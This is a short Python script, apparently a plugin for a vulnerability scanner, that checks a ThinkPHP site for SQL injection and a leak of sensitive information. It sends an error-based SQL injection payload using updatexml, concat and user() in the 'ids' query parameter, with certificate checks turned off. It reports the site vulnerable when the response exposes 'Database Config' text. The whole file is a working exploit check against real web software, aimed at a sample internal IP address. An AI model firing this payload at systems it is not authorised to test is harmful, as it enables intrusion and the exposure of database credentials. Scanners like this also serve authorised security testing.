import requests
from urllib.parse import urlparse
requests.packages.urllib3.disable_warnings()

name = 'ThinkPHP SQL注入漏洞 && 敏感信息泄露'


def run(url):
    host = urlparse(url)
    headers = {
    'Content-Type':'application/x-www-form-urlencoded',
    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0',
    }
    vulurl = f"{host.scheme}://{host.netloc}/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1"
    try:
        response = requests.get(vulurl, headers=headers, timeout=15, verify=False)
        if 'Database Config' in response.text:
            return ['True',name,vulurl]
        else:
            return ['False',name]
    except Exception as e:
        return ['False',name]

if __name__ == '__main__':
    url = 'http://192.168.215.208/'
    print(run(url))